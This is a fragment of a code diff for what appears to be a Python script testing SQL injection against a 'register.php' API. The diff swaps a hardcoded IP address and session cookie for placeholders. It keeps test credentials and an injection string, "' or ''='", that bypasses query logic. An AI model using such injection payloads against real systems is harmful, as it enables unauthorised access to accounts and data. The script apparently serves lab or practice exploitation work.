@@ -2,11 +2,11 @@ import requests
 from urllib.parse import urlparse
 
 # Inputs:
-url = 'https://83.136.253.5:46642/api/register.php'
+url = 'https://<ip>/api/register.php'
 usr = 'unamex'
 passwd = 'Passwd#12'
 inj = "' or ''='"
-cookie = {'PHPSESSID': 'g8am22ifc0urtskcui3nr662uo'}
+cookie = {'PHPSESSID': '<cookie>'}
 
 # Request body
 data = (
